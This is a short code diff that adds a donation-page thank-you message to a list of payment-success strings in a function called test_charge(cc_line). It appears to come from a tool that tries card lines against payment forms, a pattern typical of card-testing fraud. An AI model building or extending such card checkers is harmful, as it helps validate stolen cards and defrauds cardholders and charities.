@@ -729,6 +729,7 @@ def test_charge(cc_line):
             'payment successful',
             'thank you for your payment',
             'transaction successful',
+            '<p>Thank You! <br />Your gift means so much to us!</p>',
             'payment approved',
             'charge successful',
         ]
